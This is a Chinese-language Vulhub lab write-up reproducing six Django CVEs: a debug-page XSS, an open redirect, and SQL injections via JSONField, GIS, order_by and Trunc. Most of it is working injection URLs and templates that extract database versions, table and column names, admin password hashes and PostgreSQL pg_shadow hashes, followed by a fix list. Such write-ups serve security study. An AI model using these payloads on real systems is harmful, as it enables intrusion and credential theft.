---
title: Django
published: 2026-11-14T10:00:00+08:00
description: 全面解析 Django 框架历年来的多个高危漏洞，涵盖 CVE-2017-12794（调试页面 XSS）、CVE-2018-14574（任意 URL 跳转）、以及 CVE-2019-14234 到 CVE-2022-34265 这五个发生在不同组件（JSONField、GIS、order_by、Trunc）中的 SQL 注入漏洞的原理分析与实战复现。
image: images/Pasted image 20261026094030.png
tags:
  - Vulhub
  - CVE
category: Vulhub靶场
draft: false
pinned: false
lang: zh-CN
author: Ynm
comment: true
---


| 项目          | 详情                                                                                                 |
| ----------- | -------------------------------------------------------------------------------------------------- |
| **攻击机**     | Kali Linux（IP：192.168.197.128）                                                                     |
| **靶机**      | Ubuntu Server 24.04（IP：192.168.197.88）                                                             |
| **CVSS 评分** | CVE-2017-12794: 6.1（中危） / CVE-2018-14574: 6.1（中危） / 多个 SQL注入: 8.8~9.8（高危/严重）                       |
| **典型漏洞编号**  | CVE-2017-12794 / CVE-2018-14574 / CVE-2019-14234 / CVE-2020-9402 / CVE-2021-35042 / CVE-2022-34265 |
| **影响组件**    | Django 1.11.x / 2.0.x / 2.2.x / 3.0.x / 3.2.x / 4.0.x （各漏洞具体影响版本不同）                                |
| **漏洞类型**    | 跨站脚本（XSS） / 任意 URL 跳转 / SQL 注入                                                                     |
| **利用条件**    | 开启 DEBUG 模式（XSS） / 特定中间件配置（跳转） / 用户输入被直接拼接至数据库查询（SQL 注入）                                           |
| **核心原理**    | 错误页面未转义HTML、重定向路径处理不当、ORM底层函数及特定字段（JSON、排序等）查询参数未严格过滤/参数化                                          |

## 一、漏洞原理

Django 作为 Python 最流行的 Web 框架之一，历史上出现过多个由于参数过滤不严导致的安全漏洞。本次复现主要包含以下几类：

1. **调试页面 XSS (CVE-2017-12794)**：在开启 `DEBUG = True` 时，若触发数据库唯一性约束报错，错误页面会将包含用户输入的错误信息直接渲染，未进行 HTML 转义，导致反射型 XSS。
2. **任意 URL 跳转 (CVE-2018-14574)**：当启用 `CommonMiddleware` 和 `APPEND_SLASH` 时，若存在以斜杠结尾的 URL 模式，攻击者访问 `//www.evil.com`，Django 会将其重定向，浏览器会将其解析为外部协议，造成开放重定向。
3. **多场景 SQL 注入**：
   * **CVE-2019-14234**：`JSONField` / `HStoreField` 的键名未严格过滤，导致注入。
   * **CVE-2020-9402**：GIS 查询中的容差参数存在注入。
   * **CVE-2021-35042**：`QuerySet.order_by()` 接收不可信输入，导致列位置注入。
   * **CVE-2022-34265**：`Trunc()` 和 `Extract()` 数据库函数的 `kind` / `lookup_name` 参数未受保护。

---

## 二、漏洞复现

### 1. CVE-2017-12794（调试页面 XSS）

当 Django 开启 `DEBUG = True` 时，如果程序抛出异常（如数据库唯一性约束报错），Django 会渲染一个详细的错误调试页面。由于该页面在渲染错误信息时，未对用户可控的输入进行 HTML 转义，攻击者可以将 JavaScript 代码注入到错误信息中，从而触发反射型跨站脚本攻击（XSS）。

**复现步骤**：

启动靶机（端口 8000），访问以下 URL 创建用户：
```text wrap
http://192.168.197.88:8000/create_user/?username=<script>alert(1)</script>
```
第一次访问会成功创建该用户；**再次访问**相同的 URL，会触发数据库唯一性约束错误。由于 DEBUG 模式开启，错误页面将在错误消息中包含未经转义的用户名（这里的用户名是`<script>alert(1)</script>`），错误页面渲染了我们的 `<script>` 标签，弹窗成功执行。


![](images/Pasted%20image%2020261026101202.png)
![](images/Pasted%20image%2020261026101233.png)

用户名中的 JavaScript 代码将在浏览器中执行，证实了 XSS 漏洞的存在。攻击者可以利用此漏洞在调试页面的上下文中执行任意 JavaScript 代码，可能导致会话劫持或其他客户端攻击。
### 2. CVE-2018-14574（任意 URL 跳转）

当项目启用了 `CommonMiddleware` 中间件和 `APPEND_SLASH` 设置时，如果存在接受以斜杠结尾的任意路径的 URL 模式，Django 在处理类似 `//www.example.com` 的请求时，会误认为它是一个内部路径并追加斜杠。浏览器接收到重定向响应后，会将 `//www.example.com` 解析为协议相对 URL（即绝对外部链接），从而导致开放重定向漏洞，常被用于钓鱼攻击。

**复现步骤**：

直接访问以下 URL：
```text wrap
http://192.168.197.88:8000//www.example.com
```
服务器将重定向到 `//www.example.com/`，浏览器会将其解释为绝对 URL，从而实现对外部站点的重定向：

**注意：**`www.example.com` 是互联网上一个**专门用于教学、文档和测试的“官方示例域名”**。它由国际互联网号码分配局（IANA）保留。简单来说，它就是一个**占位符** ，相当于数学题里的“小明”或“X”。
![](images/Pasted%20image%2020261026131715.png)
攻击者可以利用此漏洞将用户重定向到恶意网站，可能导致钓鱼攻击或其他安全问题。

### 3. CVE-2019-14234（JSONField SQL 注入）

当开发者在模型中使用 `JSONField` 或 `HStoreField` 字段，且允许用户控制查询集中的键名（如 `?detail__key=value`）时，Django 内部的查询构造器（QuerySet）未对键名进行严格的白名单过滤或安全转义，直接将其拼接到了底层 SQL 语句中，导致攻击者可以构造恶意的键名实施 SQL 注入。Django 自带的 admin 管理界面的过滤器默认受此漏洞影响。

**复现步骤**：

首先登录后台：`http://192.168.197.88:8000/admin/` （账号 `admin`，密码 `a123123123`，这个是 **Vulhub 靶场作者为了方便复现漏洞，人为提前写死在数据库里的**）。

访问 Collection 列表页，构造带有引号的 GET 参数触发报错注入：
```text wrap
http://192.168.197.88:8000/admin/vuln/collection/?detail__a%27b=123
```
页面返回错误，并在错误页面中泄露了 SQL 语句，证明注入成功。
![](images/Pasted%20image%2020261026134738.png)
**①数据库版本**
```text wrap
http://192.168.197.88:8000/admin/vuln/collection/?detail__a%27%29%20%3D%20%27%22123%22%27%20OR%201%3DCAST%28%28SELECT%20version%28%29%29%20AS%20int%29%20--%20=123
```
![](images/Pasted%20image%2020261026142831.png)
**②当前库 / 当前用户**
```text wrap
http://192.168.197.88:8000/admin/vuln/collection/?detail__a%27%29%20%3D%20%27%22123%22%27%20OR%201%3DCAST%28%28%27x%27%7C%7CCAST%28%28SELECT%20current_database%28%29%7C%7C%27%20%2F%20%27%7C%7Ccurrent_user%29%20AS%20text%29%29%20AS%20int%29%20--%20=123
```
当前库前面的 `x` 不要，这是命令自己加的。
![](images/Pasted%20image%2020261026143513.png)
**③所有表**
```text wrap
http://192.168.197.88:8000/admin/vuln/collection/?detail__a%27%29%20%3D%20%27%22123%22%27%20OR%201%3DCAST%28%28SELECT%20string_agg%28table_name%2C%27%2C%27%29%20FROM%20information_schema.tables%20WHERE%20table_schema%3D%27public%27%29%20AS%20int%29%20--%20=123
```
![](images/Pasted%20image%2020261026143702.png)
**④`auth_user` 的列名**
```text wrap
http://192.168.197.88:8000/admin/vuln/collection/?detail__a%27%29%20%3D%20%27%22123%22%27%20OR%201%3DCAST%28%28SELECT%20string_agg%28column_name%2C%27%2C%27%29%20FROM%20information_schema.columns%20WHERE%20table_name%3D%27auth_user%27%29%20AS%20int%29%20--%20=123
```
![](images/Pasted%20image%2020261026143803.png)
**⑤拖管理员账号和哈希（密码经过哈希加密）**
```text wrap
http://192.168.197.88:8000/admin/vuln/collection/?detail__a%27%29%20%3D%20%27%22123%22%27%20OR%201%3DCAST%28%28%27x%27%7C%7CCAST%28%28SELECT%20string_agg%28username%7C%7C%27%3A%27%7C%7Cpassword%2C%20%27%20%7C%20%27%29%20FROM%20auth_user%29%20AS%20text%29%29%20AS%20int%29%20--%20=123
```
管理员账号前面的 `x` 不要，这是命令自己加的。
![](images/Pasted%20image%2020261026144835.png)
总结一下，只替换 `(SELECT ...)` 里的 SQL，其余照抄模板：

```text wrap
a') = '"123"' OR 1=CAST((SELECT <SQL>) AS int) -- 
```

**注意**：上面数字结果要套一层 `('x'||CAST((SELECT <SQL>) AS text))`，否则转型成功、页面不回显（**哨兵写法**）。

在安全测试和编程中，**“哨兵”（Sentinel）** 通常指的是一个特殊的标记或值，它的作用是用来强制触发某种特定的逻辑，或者用来标记边界。在刚才复现的 SQL 注入漏洞里，“哨兵”指的是我们强行拼接到查询结果前面的那个字符 `x`。如果不加哨兵，会发生什么？在 PostgreSQL 的报错注入中，核心逻辑是让数据库执行 `CAST(查询结果 AS int)`。
- 如果查出来的结果是 `admin`（字母），转成整数必定失败，数据库报错：`invalid input syntax for integer: "admin"`。**我们成功拿到了数据。**
- **但是**，如果查出来的结果恰好是 `123`（数字），`CAST('123' AS int)` 就会**转换成功**。数据库不报错，页面正常刷新，**我们就什么都拿不到！**

因此，为了确保**无论查出来的是什么，都绝对会报错**，我们就派出了一个“哨兵”——字母 `x`。

Django 的密码哈希格式是：`算法$迭代次数$盐值$哈希值`。  现在我想要验证从数据库中得到的`pbkdf2_sha256$150000$bctj0Par4QXh$a+FJDHbNI8uJvRN0QdXkCtHTB063D2IiNUoKV7aOfqU=`是否是`a123123123`哈希加密后的结果，可以使用下面的python代码快速验证：
```python wrap
import hashlib
import base64

# 从你的哈希中提取的参数
password = "a123123123".encode('utf-8')
salt = "bctj0Par4QXh".encode('utf-8')
iterations = 150000
target_hash = "a+FJDHbNI8uJvRN0QdXkCtHTB063D2IiNUoKV7aOfqU="

# 用 pbkdf2_hmac 计算 SHA256 哈希
dk = hashlib.pbkdf2_hmac('sha256', password, salt, iterations)

# Django 会把算出来的二进制结果转成 Base64
calculated_hash = base64.b64encode(dk).decode('utf-8')

print(f"算出来的结果: {calculated_hash}")
print(f"数据库里的值: {target_hash}")
if calculated_hash == target_hash:
    print("✅ 验证成功！明文密码就是 a123123123")
else:
    print("❌ 验证失败，密码不对。")
```

![](images/Pasted%20image%2020261026145328.png)

得到了数据库中的管理员账号和密码，其他数据也可以按照此类似的方法获取，至此整个数据库已被拿下。
### 4. CVE-2020-9402（GIS 函数 SQL 注入）
**漏洞原理**：
Django 的 GIS（地理信息系统）查询功能中，某些空间查询函数（如 `distance_lte` 等）允许接收一个容差参数（tolerance）。由于框架未对该参数进行严格的数据类型校验和过滤，直接将其拼接进 SQL 语句，导致 SQL 注入。该漏洞主要影响使用 Oracle 数据库的业务环境。

**复现步骤**：
访问带有容差参数漏洞的接口，构造恶意 `q` 参数：
```text wrap
http://192.168.197.88:8000/vuln/?q=20) = 1 OR (select utl_inaddr.get_host_name((SELECT version FROM v$instance)) from dual) is null OR (1+1
```
SQL 错误回显，确认注入存在。
![](images/Pasted%20image%2020261105103554.png)
以下 Payload 都进行了 **URL 编码** ，核心模板是：  
`q=20) = 1 OR (select utl_inaddr.get_host_name((<你的子查询>)) from dual) is null OR (1+1`

1. **获取当前数据库用户**
```text wrap
http://192.168.197.88:8000/vuln/?q=20)%20%3D%201%20OR%20(select%20utl_inaddr.get_host_name((SELECT%20user%20FROM%20DUAL))%20from%20dual)%20is%20null%20OR%20(1%2B1
```
预期在报错信息中看到类似：`ORA-29257: host 用户名 unknown`
![](images/Pasted%20image%2020261105104450.png)
2. **获取数据库版本**
```text wrap
http://192.168.197.88:8000/vuln/?q=20)%20%3D%201%20OR%20(select%20utl_inaddr.get_host_name((SELECT%20version%20FROM%20v%24instance))%20from%20dual)%20is%20null%20OR%20(1%2B1
```
预期在报错信息中看到类似：`ORA-29257: host 版本号 unknown`
![](images/Pasted%20image%2020261105104611.png)
3. **获取所有表名**
```text wrap
http://192.168.197.88:8000/vuln/?q=20)%20%3D%201%20OR%20(select%20utl_inaddr.get_host_name((SELECT%20listagg(table_name%2C%20%27%2C%27)%20WITHIN%20GROUP%20(ORDER%20BY%20table_name)%20FROM%20user_tables))%20from%20dual)%20is%20null%20OR%20(1%2B1
```
预期在报错信息中看到以逗号分隔的所有表名。
![](images/Pasted%20image%2020261105104652.png)
4. **获取指定表的列名（以 AUTH_USER 为例）**
```text wrap
http://192.168.197.88:8000/vuln/?q=20)%20%3D%201%20OR%20(select%20utl_inaddr.get_host_name((SELECT%20listagg(column_name%2C%20%27%2C%27)%20WITHIN%20GROUP%20(ORDER%20BY%20column_name)%20FROM%20user_tab_columns%20WHERE%20table_name%20%3D%20%27AUTH_USER%27))%20from%20dual)%20is%20null%20OR%20(1%2B1
```
![](images/Pasted%20image%2020261105104734.png)
5. **提取管理员（admin）密码哈希**
```text wrap
http://192.168.197.88:8000/vuln/?q=20)%20%3D%201%20OR%20(select%20utl_inaddr.get_host_name((SELECT%20password%20FROM%20AUTH_USER%20WHERE%20username%20%3D%20%27admin%27%20AND%20ROWNUM%20%3D%201))%20from%20dual)%20is%20null%20OR%20(1%2B1
```
![](images/Pasted%20image%2020261105104849.png)
### 5. CVE-2021-35042（order_by SQL 注入）
**漏洞原理**：
当开发者将用户可控的输入直接传递给 `QuerySet.order_by()` 函数用于动态排序时，Django 未对传入的字段名（列名）进行有效性校验，允许包含特殊字符。攻击者可以通过构造恶意的排序参数闭合原有的 SQL 语句，并附加任意 SQL 查询（如报错注入、联合查询），从而获取数据库敏感信息。

**复现步骤**：
访问列表页，通过 `order` 参数注入报错语句：
```text wrap
http://192.168.197.88:8000/vuln/?order=vuln_collection.name);select updatexml(1, concat(0x7e,(select @@version)),1)%23
```
页面报错并回显数据库版本信息，利用成功。
![](images/Pasted%20image%2020261105111315.png)
后续所有Payload都基于以下基础模板构造：  
`http://192.168.197.88:8000/vuln/?order=vuln_collection.name);select updatexml(1, concat(0x7e, (<你的子查询>), 0x7e), 1)%23`
1. **获取数据库版本**

```text wrap
http://192.168.197.88:8000/vuln/?order=vuln_collection.name);select%20updatexml(1,%20concat(0x7e,(select%20@@version),0x7e),1)%23
```
**预期报错**：`XPATH syntax error: '~x.x.xx~'`
![](images/Pasted%20image%2020261114114359.png)
2. **获取当前数据库名**

```text wrap
http://192.168.197.88:8000/vuln/?order=vuln_collection.name);select%20updatexml(1,%20concat(0x7e,(select%20database()),0x7e),1)%23
```
**预期报错**：`XPATH syntax error: '~cve~'`
![](images/Pasted%20image%2020261114114507.png)
3. **获取当前数据库用户**

```text wrap
http://192.168.197.88:8000/vuln/?order=vuln_collection.name);select%20updatexml(1,%20concat(0x7e,(select%20user()),0x7e),1)%23
```
**预期报错**：`XPATH syntax error: '~root@localhost~'`
![](images/Pasted%20image%2020261114114609.png)
4. **获取当前数据库中的所有表名**

查询 `information_schema.tables` 来获取当前数据库下的所有表。
```text wrap
http://192.168.197.88:8000/vuln/?order=vuln_collection.name);select%20updatexml(1,%20concat(0x7e,(select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()),0x7e),1)%23
```
**预期报错**：`XPATH syntax error: '~auth_group,auth_permission,auth_user,...~'` (表名列表)
![](images/Pasted%20image%2020261114114707.png)

5. **获取 vuln_collection 表的列名**

利用 `information_schema.columns` 查询现有表的列名：
```text wrap
http://192.168.197.88:8000/vuln/?order=vuln_collection.name);select%20updatexml(1,%20concat(0x7e,(select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name='vuln_collection'),0x7e),1)%23
```
**预期报错**：`XPATH syntax error: '~id,name~'` （具体列名以实际回显为准）。

*注：如果列名比较多超过 32 个字符被截断了，可以用 `limit 0,1` 一个个查，或者用`substring(group_concat(column_name),1,32)` 分段看。*

![](images/Pasted%20image%2020261114115106.png)
6. **提取 vuln_collection 表中的业务数据**

根据上一步查到列名有 `id`、`name`，我们尝试把第一行的数据提取出来。

```text wrap
http://192.168.197.88:8000/vuln/?order=vuln_collection.name);select%20updatexml(1,%20concat(0x7e,(select%20concat(id,0x3a,name)%20from%20vuln_collection%20limit%200,1),0x7e),1)%23
```
> **预期报错**：`XPATH syntax error: '~1:Example 1~'`

![](images/Pasted%20image%2020261114115149.png)
至此已经得到数据库中的数据，后续也可以进一步获取其他数据，这里不再演示。
### 6. CVE-2022-34265（Trunc/Extract SQL 注入）

**漏洞原理**：
Django 提供的数据库函数 `Trunc()` 和 `Extract()` 用于处理日期和时间提取。如果开发者将用户输入作为这两个函数的 `kind` 参数传入，Django 未对其进行安全过滤就拼接到了数据库执行。攻击者通过传入包含特殊字符的参数，即可突破原有查询逻辑，实现报错注入。

**注入点分析与踩坑记录**：
该应用使用 `Trunc` 函数按时间聚合数据。当我们传入 `?date=xxxx'xxxx` 时，Django 抛出了错误，并在调试页面给出了底层 SQL 语句：
![](images/Pasted%20image%2020261114134556.png)
```sql wrap
SELECT DATE_TRUNC('<K>', "vuln_weblog"."created_time") AS "time",
       COUNT("vuln_weblog"."id") AS "count"
FROM "vuln_weblog"
GROUP BY DATE_TRUNC('<K>', "vuln_weblog"."created_time")
ORDER BY "time" DESC
```
**关键点**：同一段 `<K>` 在 `SELECT` 和 `GROUP BY` 中出现了两次。如果我们像常规注入那样用 `minute') AND 1=CAST(...)--` 提前闭合 `DATE_TRUNC` 函数，会导致后面的 `, "vuln_weblog"."created_time")` 解析失败（报错 `syntax error at or near ")"`）。

**正确的 Payload 构造**：
为了保持原有函数结构不破坏，正确做法是把子查询利用字符串拼接符 `||` 直接拼进第一个参数字符串中：
```sql wrap
year'||('x'||(SELECT <SQL>))::int||'
```
代入后端后，SQL 变为：
```sql wrap
DATE_TRUNC('year'||('x'||(SELECT <SQL>))::int||'', "vuln_weblog"."created_time")
```
在 PostgreSQL 中，子查询结果前加上哨兵字符 `x`，再通过 `::int` 强制类型转换，必然触发报错，异常信息中就会带出我们查询的数据。

**① 获取数据库版本**
```text wrap
http://192.168.197.88:8000/?date=year%27%7C%7C%28%27x%27%7C%7C%28SELECT%20version%28%29%29%29%3A%3Aint%7C%7C%27
```
> **预期报错回显**：`invalid input syntax for type integer: "xPostgreSQL 13.23 ..."`

![](images/Pasted%20image%2020261114134959.png)
**② 获取当前库名与用户**
```text wrap
http://192.168.197.88:8000/?date=year%27%7C%7C%28%27x%27%7C%7C%28SELECT%20current_database%28%29%7C%7C%27%2F%27%7C%7Ccurrent_user%29%29%3A%3Aint%7C%7C%27
```
> **预期报错回显**：`invalid input syntax for type integer: "xCVE_2022_34265/postgres"`

![](images/Pasted%20image%2020261114135101.png)
**③ 获取当前库的所有表名**
```text wrap
http://192.168.197.88:8000/?date=year%27%7C%7C%28%27x%27%7C%7C%28SELECT%20string_agg%28table_name%2C%27%2C%27%29%20FROM%20information_schema.tables%20WHERE%20table_schema%3D%27public%27%29%29%3A%3Aint%7C%7C%27
```
> **预期报错回显**：`invalid input syntax for type integer: "xdjango_migrations,vuln_weblog"`

![](images/Pasted%20image%2020261114135156.png)
**④ 获取 vuln_weblog 表的列名**
```text wrap
http://192.168.197.88:8000/?date=year%27%7C%7C%28%27x%27%7C%7C%28SELECT%20string_agg%28column_name%2C%27%2C%27%29%20FROM%20information_schema.columns%20WHERE%20table_name%3D%27vuln_weblog%27%29%29%3A%3Aint%7C%7C%27
```
> **预期报错回显**：`invalid input syntax for type integer: "xid,method,url,user_agent,created_time"`

![](images/Pasted%20image%2020261114135222.png)
**⑤ 提取业务数据（利用 row_to_json 一次拉取整行）**

PostgreSQL 中可以直接将整行数据转为 JSON 字符串，然后用 `OFFSET` 和 `LIMIT` 获取指定行。
```text wrap
http://192.168.197.88:8000/?date=year%27%7C%7C%28%27x%27%7C%7C%28SELECT%20row_to_json%28t%29%3A%3Atext%20FROM%20%28SELECT%20%2A%20FROM%20vuln_weblog%20ORDER%20BY%20id%20OFFSET%200%20LIMIT%201%29%20t%29%29%3A%3Aint%7C%7C%27
```
> **预期报错回显**：`invalid input syntax for type integer: "x{"id":1,"method":"GET","url":"http://192.168.197.88:8000/",...}"`
> *(要读取下一行，只需将 `OFFSET 0` 改为 `OFFSET 1`)*

![](images/Pasted%20image%2020261114135440.png)
**⑥ 提取数据库账号密码（PostgreSQL 专属）**

查询 PostgreSQL 的 `pg_shadow` 系统表，提取数据库用户及 MD5 密码哈希：
```text wrap
http://192.168.197.88:8000/?date=year%27%7C%7C%28%27x%27%7C%7C%28SELECT%20string_agg%28usename%7C%7C%27%3A%27%7C%7Ccoalesce%28passwd%2C%27%28null%29%27%29%2C%27%20%7C%20%27%29%20FROM%20pg_shadow%29%29%3A%3Aint%7C%7C%27
```
> **预期报错回显**：`invalid input syntax for type integer: "xpostgres:md53175bce1d3201d16594cebf9d7eb3f9d"`
> 
> **解密**：该 MD5 值为 `md5(postgres + postgres)`，即数据库管理员账号密码均为 `postgres`，权限极高，为超级用户。

![](images/Pasted%20image%2020261114135532.png)

---
## 三、漏洞原理总结

| 漏洞编号 | 漏洞类型 | 触发入口 | 核心成因 |
| :--- | :--- | :--- | :--- |
| **CVE-2017-12794** | XSS | 数据库报错页 | 错误消息未进行 HTML 转义 |
| **CVE-2018-14574** | URL 跳转 | `//` 协议相对路径 | 路由规范化处理不当 |
| **CVE-2019-14234** | SQL 注入 | JSONField 键名 | 字段键名拼接时未转义 |
| **CVE-2020-9402** | SQL 注入 | GIS 查询参数 | 容差参数直接拼接 SQL |
| **CVE-2021-35042** | SQL 注入 | `order_by()` 参数 | 未限制排序字段的有效性 |
| **CVE-2022-34265** | SQL 注入 | `Trunc()` / `Extract()` | 聚合函数参数未受保护 |

**核心本质**：Django 作为一个重度依赖 ORM 的框架，大部分 SQL 注入都是因为在使用底层数据库函数、或者允许用户控制查询字段名（如排序、JSON 键名）时，没有使用参数化查询或白名单校验，导致恶意输入被直接拼接进了 SQL 语句。

---
## 四、修复方案

1. **及时升级版本**：将 Django 升级至官方安全公告中提到的安全版本及以上（如 LTS 版本）。
2. **关闭 DEBUG 模式**：生产环境绝对禁止开启 `DEBUG = True`，防止报错页面泄露敏感信息或引发 XSS。
3. **限制输入**：对于 `order_by()`、`Trunc()` 等接收字段名的函数，使用白名单限制用户输入，禁止直接将用户输入作为参数传递。
4. **配置 WAF 防护**：在网关层拦截常见的 SQL 注入特征（如 `updatexml`、`extractvalue`、单引号闭合等）。